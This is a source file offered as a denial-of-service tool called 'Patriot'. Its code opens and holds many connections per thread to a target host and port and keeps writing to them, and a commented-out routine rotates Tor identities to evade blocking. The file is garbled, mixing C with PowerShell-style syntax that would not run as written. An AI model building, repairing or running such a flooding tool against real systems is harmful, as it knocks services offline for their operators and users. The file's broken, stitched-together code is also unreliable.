#	Patriot: The most powerful DOS tool in the world
#	Courtesy of the
#	  	  ___               _             ___
#		 |   \ __ _ _ _  __(_)_ _  __ _  | _ ) ___ __ _ _ _
#		 | |) / _` | ' \/ _| | ' \/ _` | | _ \/ -_) _` | '_|
#		 |___/\__,_|_||_\__|_|_||_\__, | |___/\___\__,_|_|
#		                          |___/
#

int MAKE_SOCKET(
		char *host, 
		char *port
	) 	
{
	struct addrinfo hints, *servinfo, *p;
	int sock, r;
	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
		fprintf(stderr, "GETADDRINFO_ERR -> %s\n", gai_strerror(r));
		exit(0);
	}
	for(p = servinfo; p != NULL; p = p->ai_next) {
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			continue;
		}
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
			close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) {
		if(servinfo)
			freeaddrinfo(servinfo);
		fprintf(stderr, "NO_CONNECTION_ERR: No connection to the provided host or port could be made.\n");
		exit(0);
	}
	if(servinfo)
		freeaddrinfo(servinfo);
	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
	return sock;
}

void broke(int s) {
	// do nothing
}

[int]$global:CONNECTIONS = 8
[int]$global:THREADS = 48

function ATTACK {
	param (
		[string]$host, 
		[string]$port, 
		[int]$id
	) 

	[int[]]$sockets @(0, 0, 0, 0, 0, 0, 0, 0)
	[int]$x
	[int]$g = 1
	[int]$r

	signal(SIGPIPE, &broke);
	while(1) {
		for(x=0; x != CONNECTIONS; x++) {
			if(sockets[x] == 0)
				sockets[x] = MAKE_SOCKET(host, port);
			r=write(sockets[x], "\0", 1);
			if(r == -1) {
				close(sockets[x]);
				sockets[x] = MAKE_SOCKET(host, port);
			} else
				//fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
			fprintf(stderr, "[%i: Volley Fired]\n", id);
		}
		fprintf(stderr, "[%i: Missile Fired]\n", id);
		usleep(300000);
	}
}

function CYCLE_IDENTITY() {
	#int r;
	#int socket = MAKE_SOCKET("localhost", "9050");
	#write(socket, "AUTHENTICATE \"\"\n", 16);
	#while(1) {
	#	r=write(socket, "signal NEWNYM\n\x00", 16);
	#	fprintf(stderr, "[%i: CYCLE_IDENTITY -> signal NEWNYM\n", r);
	#	usleep(300000);
	#}
}

function main {
	param ( 
		$ip,
		$port
	) 

	[int]$x
	if($args.Length -lt 3) {
		write-host "Usage: patriot [HOST-IP-ADDR] [PORT] " -f Red
		CYCLE_IDENTITY
	}
	for($x = 0; $x -lt $THREADS; $x++) {
		if(fork ) {
			ATTACK $ip, $port, $x 
		}
		start-sleep -m 200000
	}
	read-host ""
	return 0
}

